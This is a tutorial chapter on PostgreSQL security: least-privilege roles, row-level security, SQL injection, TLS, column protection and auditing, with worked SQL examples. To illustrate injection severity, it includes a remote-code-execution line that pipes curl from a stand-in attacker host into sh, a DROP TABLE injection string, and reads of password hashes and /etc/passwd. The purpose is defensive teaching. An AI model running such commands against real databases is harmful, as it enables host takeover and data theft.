# 69 — Security at the Data Layer
## Phase: Reliability & Operations

---

## ELI5 — The Simple Analogy

A building with a receptionist who checks everyone's pass at the front door.

That works — until someone finds a side entrance, or a delivery driver props the door open, or the receptionist is tricked by a convincing uniform. **One check, at one place, protected by one person's attention.**

★ **Defence in depth is putting a lock on every door inside the building too.** The receptionist still checks. But even if someone gets past, the accounts room needs its own key, the archive needs another, and the safe needs a third.

Three ideas follow, and they are the whole topic:

1. ★ **The application's check is not the last line — it should be the *first* of several.** If the only thing stopping a query from returning another tenant's data is a `WHERE` clause a developer remembered to write, then one forgotten clause is a breach.
2. ★ **Give every key-holder exactly the doors they need.** The reporting tool does not need a key to the safe. The application does not need a key to the master lock cabinet.
3. ★ **Write down who opened which door and when** — because the question after an incident is never "was there a lock?" It is *"what did they reach?"*

---

## Where this fits in the big picture

```
   65 pooling — ★ SET search_path leaking between tenants
   64 backups — ★ the encrypted copy nobody can decrypt
   28 migrations · 51/52 — the wrong-environment migration
                          │
                          ▼
        ┌──────────────────────────────────────────────┐
        │ 69 SECURITY AT THE DATA LAYER ← YOU ARE HERE │
        │ ★ the database as a security boundary,       │
        │   not just a store                            │
        └────────────────────┬─────────────────────────┘
                             ▼
              ★ PHASE 7 COMPLETE → Phase 8 (70–76)
```

★ **This closes Phase 7 deliberately.** Reliability and security fail the same way: a single point of trust, unexercised, discovered during an incident.

---

## What is this?

Making the **database itself** enforce who may read and write what — rather than relying entirely on the application to remember.

**Six layers, and most teams have one:**

```
 ① ★ AUTHENTICATION      who are you?          (pg_hba, SCRAM, TLS)
 ② ★ AUTHORISATION       what may you touch?   (roles, GRANT)
 ③ ★ ROW-LEVEL SECURITY  which ROWS?           (RLS policies)
 ④ ★ COLUMN PROTECTION   which COLUMNS?        (column GRANTs, views)
 ⑤ ★ ENCRYPTION          at rest and in flight (TLS, disk, pgcrypto)
 ⑥ ★ AUDIT               what actually happened? (pgaudit, triggers)

 ★ MOST APPLICATIONS USE EXACTLY ONE: a single superuser-ish role
   with full access, and every restriction expressed as a WHERE
   clause in application code.
 ⇒ ★ ONE FORGOTTEN WHERE CLAUSE IS THEN A FULL BREACH.
```

★ **The one framing that matters:** *the database is the last component that still knows the truth about the data. If it enforces nothing, then every layer above it must be perfect forever.*

---

## Why does it matter for a backend developer?

```
 ★ BECAUSE THE THREE MOST COMMON DATA BREACHES ARE ALL PREVENTABLE
   AT THIS LAYER, AND ALL LOOK LIKE ORDINARY BUGS.

 ① ★ SQL INJECTION
    ⇒ still the #1 cause. And the fix — parameterised queries —
      is free, but ★ ORMs have raw-query escape hatches, and
      ★ dynamic identifiers (table/column names) CANNOT be
      parameterised at all.

 ② ★ MISSING TENANT FILTER
    SELECT * FROM invoices WHERE id = $1
    -- ★ forgot: AND tenant_id = $2
    ⇒ ★ ONE MISSING CLAUSE. Cross-tenant data exposure.
    ⇒ ★ AND Topic 65's finding: `SET search_path` behind a
      transaction-mode pooler leaks across requests — a tenant
      isolation failure caused by a POOLING setting.

 ③ ★ OVER-PRIVILEGED CREDENTIALS
    the application connects as an owner or superuser
    ⇒ ★ an SQL injection becomes DROP TABLE, or a read of
      pg_shadow, or COPY … FROM PROGRAM (★ remote code execution).
    ⇒ ★ THE SAME INJECTION IS A NUISANCE OR A CATASTROPHE
      DEPENDING ON ONE GRANT.
```

★ And the operational reason: **compliance regimes (PCI-DSS, HIPAA, GDPR, India's DPDP Act) ask for audit trails, encryption and least privilege** — and retrofitting those into a running system is far more expensive than starting with them.

---

## The physical reality

### Roles — the model people don't realise they're using

```
 ★ IN POSTGRESQL, "USERS" AND "GROUPS" ARE THE SAME THING: ROLES.
   A role with LOGIN is a user; a role without is a group.
   ⇒ ★ roles are CLUSTER-WIDE, not per-database. A role created
     for one database exists for all of them.

 ★ THE FOUR ATTRIBUTES THAT MATTER:
   SUPERUSER    ★ bypasses ALL permission checks, including RLS
   CREATEROLE   ★ can create roles — and since PG16, can grant
                  itself membership. ★ Effectively an escalation path.
   BYPASSRLS    ★ ignores row-level security
   INHERIT      automatically uses granted roles' privileges

 ★ THE PRIVILEGE THAT SURPRISES EVERYONE:
   ★ BEFORE PG 15, `PUBLIC` HAD CREATE ON THE `public` SCHEMA.
   ⇒ any role could create objects there — including a function
     that shadows a built-in.
   ⇒ ★ ON PG < 15: REVOKE CREATE ON SCHEMA public FROM PUBLIC;
   ⇒ PG 15+ fixed this by default.

 ★ AND THE ONE THAT CAUSES "IT WORKS FOR ME":
   ★ DEFAULT PRIVILEGES ARE NOT RETROACTIVE.
     GRANT SELECT ON ALL TABLES … grants on tables that exist NOW.
   ⇒ ★ a table created tomorrow is not covered.
   ⇒ ★ FIX: ALTER DEFAULT PRIVILEGES … FOR ROLE <owner>
     — and note it applies per CREATING ROLE, which is why it
     silently fails when migrations run as a different user.
```

### Row-Level Security — the mechanism, and its two traps

```sql
 ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
 CREATE POLICY tenant_isolation ON invoices
   USING (tenant_id = current_setting('app.tenant_id')::bigint);
```
```
 ★ WHAT HAPPENS: PostgreSQL appends the USING expression to
   EVERY query's WHERE clause, in the PLANNER. It cannot be
   forgotten, bypassed by a raw query, or omitted by an ORM.
 ⇒ ★ THIS IS THE DIFFERENCE BETWEEN "the application filters" and
   "the data cannot be reached".

 ★ USING vs WITH CHECK — the distinction people miss:
   USING       ⇒ which existing rows are VISIBLE (SELECT/UPDATE/DELETE)
   WITH CHECK  ⇒ which NEW rows may be WRITTEN (INSERT/UPDATE)
   ⇒ ★ WITHOUT `WITH CHECK`, A TENANT CAN INSERT ROWS BELONGING TO
     ANOTHER TENANT — and then not see them.
   ⇒ ★ if only USING is given, it is used for WITH CHECK too on
     UPDATE, but NOT on INSERT. ★ Always write both explicitly.

 ★ TRAP 1 — THE TABLE OWNER BYPASSES RLS BY DEFAULT.
   ⇒ ★ if your application connects as the table owner, RLS does
     NOTHING and you will not notice.
   ⇒ FIX: ALTER TABLE … FORCE ROW LEVEL SECURITY;
     ⇒ ★ and still: SUPERUSER and BYPASSRLS ignore it entirely.

 ★ TRAP 2 — THE SETTING MUST NOT LEAK (Topic 65).
   current_setting('app.tenant_id') is SESSION state.
   ⇒ ★ behind a transaction-mode pooler, SET leaks to the next
     client. ★ THIS IS A CROSS-TENANT BREACH.
   ⇒ ★ FIX: SET LOCAL, inside a transaction, always.

 ★ AND THE PERFORMANCE NOTE THAT DECIDES WHETHER RLS IS USABLE:
   the policy expression becomes a filter. If tenant_id is not
   INDEXED, every query becomes a seq scan with a filter.
   ⇒ ★ index (tenant_id, …) as the LEADING column on every
     RLS-protected table.
   ⇒ ★ and mark helper functions STABLE, or they are re-evaluated
     per row.
```

### SQL injection — the two cases, and why one has no parameter

```
 ★ CASE 1 — VALUES. Solved, completely, by parameters.
   ✗ `SELECT * FROM users WHERE email = '${email}'`
   ✓ SELECT * FROM users WHERE email = $1
   ⇒ ★ the value NEVER enters the SQL text. It is sent separately,
     after parsing. Injection is structurally impossible.

 ★ CASE 2 — IDENTIFIERS. ★ CANNOT BE PARAMETERISED.
   ORDER BY ${column}          ⇒ ★ $1 does not work here
   SELECT * FROM ${table}      ⇒ ★ nor here
   ⇒ ★ THIS IS WHERE MODERN INJECTIONS LIVE, because everyone
     knows about values and nobody thinks about sort columns.
   ⇒ FIXES, in order:
     ① ★ AN ALLOWLIST — the only genuinely safe option
        const COLS = { created: 'created_at', total: 'total_minor' };
        const col = COLS[req.query.sort] ?? 'created_at';
     ② quote_ident() / format('%I') server-side
     ③ a library's identifier escaper (pg-format's %I)
     ✗ ★ NEVER a regex "sanitiser". They are always incomplete.

 ★ AND THE THIRD CASE PEOPLE FORGET:
   ★ LIKE PATTERNS. A user-supplied '%' turns an equality lookup
     into a full scan — ★ a denial of service, not a data leak.
   ⇒ escape %, _ and \ in user input used in LIKE.
```

### What an over-privileged connection turns an injection into

```
 ★ THE SAME INJECTION, AT FOUR PRIVILEGE LEVELS:

 as a role with SELECT on one schema
   ⇒ reads it can already read. ★ Bad, bounded.
 as a role with SELECT on everything
   ⇒ ★ every table, including other tenants and PII.
 as the table OWNER
   ⇒ ★ DROP TABLE. ALTER TABLE. ★ and RLS is bypassed.
 as SUPERUSER
   ⇒ ★ COPY … FROM PROGRAM 'curl attacker.com/x | sh'
     ⇒ ★ REMOTE CODE EXECUTION AS THE POSTGRES OS USER.
   ⇒ ★ read pg_shadow / pg_authid ⇒ password hashes
   ⇒ ★ pg_read_file() ⇒ arbitrary files on the host

 ⇒ ★ THE APPLICATION ROLE SHOULD OWN NOTHING AND CREATE NOTHING.
   Migrations run as a DIFFERENT role, from a different credential,
   in a different process.
```

### Encryption — three different problems

```
 ★ ① IN FLIGHT — TLS
    ssl = on, and on the client: ★ sslmode=verify-full
    ⇒ ★ `require` ONLY encrypts. It does NOT verify the server's
      identity ⇒ ★ a MITM with any certificate succeeds.
    ⇒ ★ `verify-full` checks the CA *and* the hostname. Use it.

 ★ ② AT REST — full-disk / volume encryption
    ⇒ ★ protects against a stolen disk or a decommissioned volume.
    ⇒ ★ PROTECTS AGAINST NOTHING ELSE. A compromised database
      process reads plaintext, because the volume is mounted.
    ⇒ ★ it is a compliance control, not an application one.

 ★ ③ COLUMN-LEVEL — pgcrypto
    ⇒ protects specific fields even from someone with SELECT.
    ⇒ ★ THE PROBLEM: if the key is in the database, or passed in
      every query, it is in pg_stat_activity and the logs.
    ⇒ ★ AND: an encrypted column ★ CANNOT BE INDEXED for range or
      prefix queries. Equality only, via a deterministic scheme —
      which leaks equality.
    ⇒ ★ IN PRACTICE: encrypt in the APPLICATION, with keys from a
      KMS, and accept that the column is opaque to SQL.

 ★ AND THE BACKUP PROBLEM (Topic 64):
   ★ THE ENCRYPTION KEY MUST NOT LIVE ONLY IN THE DATABASE YOU ARE
   BACKING UP. It is the classic way to have backups you cannot
   restore.
```

### Audit — what `log_statement` cannot do

```
 ★ log_statement = 'all' LOGS EVERYTHING, INCLUDING:
   ✗ ★ parameter values in the logs (★ PII in plaintext, forever)
   ✗ ★ enormous volume — often 10× the WAL
   ✗ ★ and it still does not tell you WHICH ROWS were read.

 ★ pgaudit DOES BETTER:
   pgaudit.log = 'write, ddl, role'
   pgaudit.log_relation = on         ★ names the objects touched
   pgaudit.log_parameter = off       ★ ← keep PII out of logs
   ⇒ ★ session auditing (by class) and OBJECT auditing (by GRANT
     on a specific table to an audit role) — the latter lets you
     audit only the sensitive tables.

 ★ AND THE APPLICATION-LEVEL AUDIT THAT ACTUALLY ANSWERS
   "WHO SAW WHAT":
   ⇒ ★ a trigger-based audit table capturing OLD/NEW for writes,
     plus the acting user from a SET LOCAL variable.
   ⇒ ★ reads are much harder to audit meaningfully — which is why
     the real control is RLS (they could not read it) rather than
     audit (we know they did).
```

---

## How it works — step by step

### The role hierarchy

```sql
-- ★ ① GROUP ROLES — no LOGIN, they exist to hold privileges
CREATE ROLE app_read   NOLOGIN;
CREATE ROLE app_write  NOLOGIN;
CREATE ROLE app_admin  NOLOGIN;

-- ★ ② LOGIN ROLES — the actual credentials
CREATE ROLE app_service  LOGIN PASSWORD :'app_pw'  IN ROLE app_write;
CREATE ROLE reporting    LOGIN PASSWORD :'rep_pw'  IN ROLE app_read;
CREATE ROLE migrator     LOGIN PASSWORD :'mig_pw'  IN ROLE app_admin;

-- ★ ③ LOCK DOWN THE DEFAULTS
REVOKE ALL ON DATABASE shop FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM PUBLIC;      -- ★ critical on PG < 15
GRANT CONNECT ON DATABASE shop TO app_read, app_write, app_admin;
GRANT USAGE ON SCHEMA app TO app_read, app_write;

-- ★ ④ PRIVILEGES BY ROLE
GRANT SELECT ON ALL TABLES IN SCHEMA app TO app_read;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA app TO app_write;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA app TO app_write;

-- ★ ⑤ DEFAULT PRIVILEGES — for tables that DON'T EXIST YET
--     ★ NOTE "FOR ROLE migrator": this applies to objects created
--       BY migrator. Omitting it is why this silently fails.
ALTER DEFAULT PRIVILEGES FOR ROLE migrator IN SCHEMA app
  GRANT SELECT ON TABLES TO app_read;
ALTER DEFAULT PRIVILEGES FOR ROLE migrator IN SCHEMA app
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_write;
ALTER DEFAULT PRIVILEGES FOR ROLE migrator IN SCHEMA app
  GRANT USAGE ON SEQUENCES TO app_write;

-- ★ ⑥ THE APPLICATION ROLE OWNS NOTHING
--     migrator owns the schema; app_service can only use it.
ALTER SCHEMA app OWNER TO migrator;
```
```sql
-- ★ ⑦ per-role safety settings (Topics 45, 47, 65)
ALTER ROLE reporting SET statement_timeout = '120s';
ALTER ROLE reporting SET idle_in_transaction_session_timeout = '30s';
ALTER ROLE reporting SET default_transaction_read_only = on;
ALTER ROLE app_service SET statement_timeout = '5s';
ALTER ROLE app_service SET idle_in_transaction_session_timeout = '10s';
```

### Row-Level Security, correctly

```sql
CREATE TABLE app.invoices (
  id         bigserial PRIMARY KEY,
  tenant_id  bigint NOT NULL,
  number     text   NOT NULL,
  total_minor bigint NOT NULL,
  created_at timestamptz NOT NULL DEFAULT now()
);
-- ★ THE INDEX RLS NEEDS — tenant_id must lead
CREATE INDEX ON app.invoices (tenant_id, created_at DESC);

ALTER TABLE app.invoices ENABLE ROW LEVEL SECURITY;
ALTER TABLE app.invoices ★ FORCE ROW LEVEL SECURITY;   -- ★ owner too

-- ★ SEPARATE POLICIES PER COMMAND, WITH BOTH USING AND WITH CHECK
CREATE POLICY tenant_select ON app.invoices FOR SELECT
  USING (tenant_id = current_setting('app.tenant_id', true)::bigint);

CREATE POLICY tenant_insert ON app.invoices FOR INSERT
  ★ WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint);

CREATE POLICY tenant_update ON app.invoices FOR UPDATE
  USING      (tenant_id = current_setting('app.tenant_id', true)::bigint)
  ★ WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint);

CREATE POLICY tenant_delete ON app.invoices FOR DELETE
  USING (tenant_id = current_setting('app.tenant_id', true)::bigint);
```
```
 ★ WHY `true` AS THE SECOND ARGUMENT TO current_setting:
   without it, an unset variable raises an ERROR. With it, it
   returns NULL ⇒ ★ the policy matches NOTHING ⇒ fail CLOSED.
 ⇒ ★ FAILING CLOSED IS THE POINT. A request that forgets to set
   the tenant sees zero rows, not everything.
```

```js
// ★ SETTING IT SAFELY — SET LOCAL, always (Topic 65)
async function withTenant(tenantId, fn) {
  return withTransaction(async (tx) => {
    // ★ SET LOCAL: reverted at COMMIT, cannot leak to the next
    //   client on a transaction-mode pooler.
    await tx.query('SELECT set_config($1, $2, ★ true)',
                   ['app.tenant_id', String(tenantId)]);
    //                                       ▲ is_local = true
    return fn(tx);
  });
}

app.use(async (req, res, next) => {
  const tenantId = await resolveTenant(req);   // ★ from the JWT, not a header
  if (!tenantId) return res.status(401).end();
  req.db = (fn) => withTenant(tenantId, fn);
  next();
});
```

### Column-level protection

```sql
-- ★ ① COLUMN GRANTS — the simplest option
REVOKE SELECT ON app.users FROM app_read;
GRANT SELECT (id, name, created_at) ON app.users TO app_read;
-- ⇒ ★ SELECT * FROM users now ERRORS for app_read, rather than
--   silently returning the password hash.

-- ★ ② A VIEW WITH security_invoker (PG 15+)
CREATE VIEW app.users_public
  WITH (★ security_invoker = true) AS
  SELECT id, name, created_at FROM app.users;
-- ★ security_invoker=true means the VIEW runs with the CALLER's
--   privileges ⇒ ★ RLS on the underlying table STILL APPLIES.
-- ★ WITHOUT IT, a view runs as its OWNER and ★ BYPASSES RLS —
--   a classic and severe mistake.

-- ★ ③ MASKING for non-production copies
CREATE OR REPLACE FUNCTION app.mask_email(e text) RETURNS text AS $$
  SELECT left(e, 1) || '***@' || split_part(e, '@', 2)
$$ LANGUAGE sql IMMUTABLE;
```

### Auditing writes

```sql
CREATE TABLE audit.row_changes (
  id          bigserial PRIMARY KEY,
  table_name  text        NOT NULL,
  row_id      text        NOT NULL,
  action      text        NOT NULL,
  old_data    jsonb,
  new_data    jsonb,
  ★ actor     text        NOT NULL,      -- the application user
  db_user     text        NOT NULL DEFAULT current_user,
  ★ client_addr inet      DEFAULT inet_client_addr(),
  at          timestamptz NOT NULL DEFAULT now()
) PARTITION BY RANGE (at);               -- ★ retention by DROP (59)

CREATE OR REPLACE FUNCTION audit.log_change() RETURNS trigger AS $$
BEGIN
  INSERT INTO audit.row_changes
    (table_name, row_id, action, old_data, new_data, actor)
  VALUES (
    TG_TABLE_NAME,
    coalesce((to_jsonb(NEW)->>'id'), (to_jsonb(OLD)->>'id')),
    TG_OP,
    CASE WHEN TG_OP IN ('UPDATE','DELETE') THEN to_jsonb(OLD) END,
    CASE WHEN TG_OP IN ('INSERT','UPDATE') THEN to_jsonb(NEW) END,
    -- ★ the acting user, set per transaction by the application
    coalesce(current_setting('app.actor', true), '★ UNKNOWN')
  );
  RETURN NULL;
END $$ LANGUAGE plpgsql ★ SECURITY DEFINER;
-- ★ SECURITY DEFINER so app_write can insert into audit without
--   having INSERT on the audit table directly (⇒ it cannot forge
--   or delete audit rows).

CREATE TRIGGER audit_invoices AFTER INSERT OR UPDATE OR DELETE
  ON app.invoices FOR EACH ROW EXECUTE FUNCTION audit.log_change();
```
```sql
-- ★ AND THE PART THAT MAKES IT TRUSTWORTHY: app_write cannot
--   modify the audit trail.
REVOKE ALL ON audit.row_changes FROM app_write, app_read;
GRANT SELECT ON audit.row_changes TO auditor;
-- ★ the SECURITY DEFINER function is the only write path.
```

### Connection security

```ini
# postgresql.conf
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file  = '/etc/ssl/private/server.key'
ssl_min_protocol_version = 'TLSv1.3'
password_encryption = 'scram-sha-256'    # ★ never md5
```
```
# pg_hba.conf — ★ evaluated TOP TO BOTTOM, FIRST MATCH WINS
# TYPE  DATABASE  USER          ADDRESS         METHOD
local   all       postgres                      peer
★ hostssl shop    app_service   10.0.1.0/24     scram-sha-256
★ hostssl shop    reporting     10.0.2.0/24     scram-sha-256
★ hostssl shop    migrator      10.0.9.5/32     scram-sha-256
hostssl replication repl        10.0.1.0/24     scram-sha-256
# ★ NO CATCH-ALL LINE. Anything not listed is rejected.
# ★ `hostssl` (not `host`) REQUIRES TLS. `host` permits plaintext.
```
```js
// ★ the client side — sslmode matters enormously
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    ★ rejectUnauthorized: true,          // ★ verify the CA
    ca: fs.readFileSync('/etc/ssl/certs/ca.crt'),
    ★ servername: 'pg-primary.internal', // ★ verify the hostname
  },
});
// ★ sslmode=require ONLY ENCRYPTS. verify-full also AUTHENTICATES.
```

---

## Concept breakdown

```
★ SIX LAYERS — most teams have one
   ① authn (pg_hba, SCRAM, ★ hostssl) ② authz (roles, GRANT)
   ③ ★ RLS  ④ column grants / views  ⑤ encryption  ⑥ ★ audit

★ ROLES
   ★ users and groups are the same thing; roles are CLUSTER-WIDE
   ★ SUPERUSER / CREATEROLE / BYPASSRLS are escalation paths
   ★ REVOKE CREATE ON SCHEMA public FROM PUBLIC  (PG < 15)
   ★ DEFAULT PRIVILEGES ARE NOT RETROACTIVE, and apply PER
     CREATING ROLE ⇒ ALTER DEFAULT PRIVILEGES ★ FOR ROLE migrator
   ★ THE APP ROLE OWNS NOTHING AND CREATES NOTHING

★ RLS — the policy is appended in the PLANNER
   ⇒ ★ cannot be forgotten, bypassed by a raw query, or omitted
     by an ORM
   ★ USING = which rows are visible · ★ WITH CHECK = which may be
     written. ★ Without WITH CHECK, a tenant can INSERT rows for
     another tenant.
   ★ TRAP 1: the OWNER bypasses RLS ⇒ ★ FORCE ROW LEVEL SECURITY
   ★ TRAP 2: the setting leaks behind a pooler ⇒ ★ SET LOCAL only
   ★ current_setting(…, true) ⇒ NULL when unset ⇒ ★ FAIL CLOSED
   ★ PERFORMANCE: index (tenant_id, …) leading, or every query
     becomes a filtered seq scan

★ SQL INJECTION — two cases
   ★ VALUES: parameters. Structurally impossible to inject.
   ★ IDENTIFIERS: ★ CANNOT be parameterised ⇒ ★ AN ALLOWLIST
     ⇒ ORDER BY / dynamic table names are where modern injections live
   ★ + LIKE patterns ⇒ a DoS, not a leak

★ PRIVILEGE DECIDES SEVERITY
   the SAME injection is: bounded reads · all reads · DROP TABLE ·
   ★ COPY FROM PROGRAM = REMOTE CODE EXECUTION

★ ENCRYPTION — three different problems
   ★ TLS: `require` encrypts, ★ `verify-full` AUTHENTICATES
   at rest: ★ a stolen disk only. Not an application control.
   column: ★ keys must not be in the DB or in query text;
           ★ encrypted columns cannot be range-indexed
   ★ backups: the key must NOT live only in the database

★ AUDIT
   ★ log_statement='all' puts PII in logs and still doesn't say
     which rows were read
   ★ pgaudit with log_parameter=off; object auditing for sensitive
     tables
   ★ a SECURITY DEFINER trigger so the app can WRITE audit rows
     but not FORGE or DELETE them
   ★ reads are hard to audit ⇒ the real control is RLS, not audit
```

---

## Diagrams

**Diagram 1 — big picture: what each layer stops**

```
                        THE ATTACK
     ┌──────────────┬──────────────┬──────────────┬──────────────┐
     │ SQL          │ ★ missing    │ stolen       │ ★ malicious  │
     │ injection    │ tenant filter│ credentials  │ insider      │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ①   │              │              │ ★ ✓ pg_hba   │              │
 authn│             │              │  + hostssl   │              │
     │              │              │  + SCRAM     │              │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ②   │ ★ ✓ BOUNDS   │              │ ★ ✓ bounds   │ ★ ✓ bounds   │
 authz│  THE BLAST  │              │  what the    │              │
     │  RADIUS      │              │  cred can do │              │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ③   │ ★ ✓          │ ★ ✓✓ THE     │ ★ ✓          │ ★ ✓          │
 RLS │  even a full │  ONLY LAYER  │              │              │
     │  injection   │  THAT STOPS  │              │              │
     │  sees one    │  THIS        │              │              │
     │  tenant      │              │              │              │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ④   │ ✓ no hashes  │              │ ✓            │ ✓            │
 cols│              │              │              │              │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ⑤   │              │              │ ★ ✓ TLS only │              │
 encr│              │              │  (at-rest    │              │
     │              │              │  helps only  │              │
     │              │              │  a stolen    │              │
     │              │              │  disk)       │              │
 ────┼──────────────┼──────────────┼──────────────┼──────────────┤
 ⑥   │ ★ ✓ tells    │ ★ ✓ tells    │ ★ ✓          │ ★ ✓✓ often   │
 audit│ you WHAT    │  you WHAT    │              │  the ONLY    │
     │  was reached │  was reached │              │  detection   │
     └──────────────┴──────────────┴──────────────┴──────────────┘

 ★ READ THE `missing tenant filter` COLUMN: RLS is the ONLY layer
   that stops it, because every other layer assumes the query is
   correct.
 ★ AND THE `audit` ROW: it stops nothing. It answers the question
   you will actually be asked — ★ "what did they reach?"
```

**Diagram 2 — data flow: RLS appending the predicate**

```
 ✗ WITHOUT RLS — the application is the only guard
 ┌───────────────────────────────────────────────────────────────┐
 │  app: SELECT * FROM invoices WHERE id = $1                     │
 │       ★ (developer forgot AND tenant_id = $2)                  │
 │              │                                                 │
 │              ▼                                                 │
 │  parser → planner → executor                                   │
 │              │                                                 │
 │              ▼                                                 │
 │  ★ RETURNS ANOTHER TENANT'S INVOICE                            │
 │  ★ AND: the ORM's raw-query escape hatch, a background job,    │
 │    an export, a webhook — each is another chance to forget.    │
 └───────────────────────────────────────────────────────────────┘

 ✓ WITH RLS — the predicate is added by the PLANNER
 ┌───────────────────────────────────────────────────────────────┐
 │  BEGIN;                                                        │
 │  ★ SELECT set_config('app.tenant_id','42', true);  -- LOCAL    │
 │  app: SELECT * FROM invoices WHERE id = $1                     │
 │              │                                                 │
 │              ▼                                                 │
 │  parser → ★ PLANNER APPENDS THE POLICY:                        │
 │            WHERE id = $1                                       │
 │              ★ AND tenant_id = current_setting('app.tenant_id')│
 │              ▼                                                 │
 │  ★ RETURNS ZERO ROWS. The other tenant's invoice is not        │
 │    filtered out — it is UNREACHABLE.                           │
 │  COMMIT;   ★ ⇒ the setting is reverted; nothing leaks (65)     │
 │                                                                │
 │  ★ AND IF app.tenant_id IS UNSET:                              │
 │    current_setting(…, true) ⇒ NULL ⇒ the policy matches        │
 │    nothing ⇒ ★ ZERO ROWS. FAILS CLOSED.                        │
 └───────────────────────────────────────────────────────────────┘
```

**Diagram 3 — before/after: the same injection at four privilege levels**

```
  ★ THE INJECTION (an unparameterised ORDER BY):
    GET /api/orders?sort=created_at;DROP TABLE orders--

 ┌───────────────────────────────────────────────────────────────┐
 │ ★ AS SUPERUSER                                                 │
 │   ⇒ DROP TABLE succeeds                                        │
 │   ⇒ ★ COPY … FROM PROGRAM 'curl x|sh' ⇒ RCE as the postgres    │
 │     OS user                                                    │
 │   ⇒ ★ SELECT * FROM pg_authid ⇒ every password hash            │
 │   ⇒ ★ pg_read_file('/etc/passwd')                              │
 │   ★ SEVERITY: TOTAL COMPROMISE OF THE HOST                     │
 ├───────────────────────────────────────────────────────────────┤
 │ ★ AS THE TABLE OWNER                                           │
 │   ⇒ DROP TABLE succeeds                                        │
 │   ⇒ ★ RLS IS BYPASSED (unless FORCE) ⇒ all tenants readable    │
 │   ★ SEVERITY: TOTAL DATA LOSS + CROSS-TENANT BREACH            │
 ├───────────────────────────────────────────────────────────────┤
 │ AS app_write (SELECT/INSERT/UPDATE/DELETE, ★ owns nothing)      │
 │   ⇒ DROP TABLE ★ FAILS: must be owner                          │
 │   ⇒ ★ but DELETE FROM orders succeeds                          │
 │   ⇒ ★ RLS limits it to ONE TENANT'S ROWS                       │
 │   ★ SEVERITY: one tenant's data, ★ recoverable from PITR (64)  │
 ├───────────────────────────────────────────────────────────────┤
 │ ★ AS app_write + RLS + an ALLOWLISTED sort column              │
 │   ⇒ ★ the injection never reaches SQL at all                   │
 │   ★ SEVERITY: NONE. Logged as an invalid parameter.            │
 └───────────────────────────────────────────────────────────────┘

 ★ THE SAME BUG. FOUR OUTCOMES. THE DIFFERENCE IS ENTIRELY IN
   GRANTS AND ONE ALLOWLIST.
```

---

## Example 1 — basic

**Build the role hierarchy.**
```sql
CREATE SCHEMA app;
CREATE ROLE app_read NOLOGIN;
CREATE ROLE app_write NOLOGIN;
CREATE ROLE migrator LOGIN PASSWORD 'mig';
CREATE ROLE app_service LOGIN PASSWORD 'svc' IN ROLE app_write;
CREATE ROLE reporting LOGIN PASSWORD 'rep' IN ROLE app_read;

REVOKE ALL ON SCHEMA public FROM PUBLIC;    -- ★ critical on PG < 15
ALTER SCHEMA app OWNER TO migrator;
GRANT USAGE ON SCHEMA app TO app_read, app_write;
```

**Prove default privileges are not retroactive.**
```sql
SET ROLE migrator;
CREATE TABLE app.t1 (id int);
GRANT SELECT ON ALL TABLES IN SCHEMA app TO app_read;
CREATE TABLE app.t2 (id int);           -- ★ created AFTER the GRANT
RESET ROLE;

SET ROLE reporting;
SELECT * FROM app.t1;   -- ✓
SELECT * FROM app.t2;
```
```
 ★ ERROR:  permission denied for table t2
```
```sql
RESET ROLE;
-- ★ the fix, and note FOR ROLE migrator
ALTER DEFAULT PRIVILEGES ★ FOR ROLE migrator IN SCHEMA app
  GRANT SELECT ON TABLES TO app_read;
SET ROLE migrator; CREATE TABLE app.t3 (id int); RESET ROLE;
SET ROLE reporting; SELECT * FROM app.t3;   -- ★ ✓
```

**Enable RLS and prove it works.**
```sql
RESET ROLE;
CREATE TABLE app.invoices (
  id bigserial PRIMARY KEY, tenant_id bigint NOT NULL,
  number text NOT NULL, total_minor bigint NOT NULL);
CREATE INDEX ON app.invoices (tenant_id, id);   -- ★ RLS needs this
ALTER TABLE app.invoices OWNER TO migrator;
GRANT SELECT, INSERT, UPDATE, DELETE ON app.invoices TO app_write;
GRANT USAGE ON SEQUENCE app.invoices_id_seq TO app_write;

INSERT INTO app.invoices (tenant_id, number, total_minor)
VALUES (1,'INV-1',100), (1,'INV-2',200), (2,'INV-3',300);

ALTER TABLE app.invoices ENABLE ROW LEVEL SECURITY;
CREATE POLICY t_sel ON app.invoices FOR SELECT
  USING (tenant_id = current_setting('app.tenant_id', true)::bigint);
CREATE POLICY t_ins ON app.invoices FOR INSERT
  WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint);
```
```sql
SET ROLE app_service;
SELECT set_config('app.tenant_id', '1', false);
SELECT id, tenant_id, number FROM app.invoices;
```
```
 id | tenant_id | number
----+-----------+--------
  1 |         1 | INV-1
  2 |         1 | INV-2
   ★ tenant 2's invoice is UNREACHABLE, not filtered by the app.
```

**Prove it fails closed.**
```sql
SELECT set_config('app.tenant_id', '', false);
SELECT count(*) FROM app.invoices;
```
```
 count
-------
   ★ 0        — unset ⇒ NULL ⇒ the policy matches nothing.
```

**Prove `WITH CHECK` is necessary.**
```sql
SELECT set_config('app.tenant_id', '1', false);
INSERT INTO app.invoices (tenant_id, number, total_minor)
VALUES (★ 2, 'EVIL', 999);
```
```
 ★ ERROR:  new row violates row-level security policy for table "invoices"
```
```sql
-- ★ now drop the WITH CHECK policy and retry
RESET ROLE; DROP POLICY t_ins ON app.invoices;
CREATE POLICY t_ins_bad ON app.invoices FOR INSERT WITH CHECK (true);
SET ROLE app_service;
INSERT INTO app.invoices (tenant_id, number, total_minor) VALUES (2,'EVIL',999);
```
```
 ★ INSERT 0 1        — tenant 1 just wrote a row for tenant 2,
   and cannot see it. ★ Silent cross-tenant contamination.
```

**Prove the owner bypasses RLS.**
```sql
RESET ROLE;
SET ROLE migrator;                       -- ★ the table's owner
SELECT count(*) FROM app.invoices;
```
```
 count
-------
   ★ 4        — ★ RLS DOES NOTHING FOR THE OWNER.
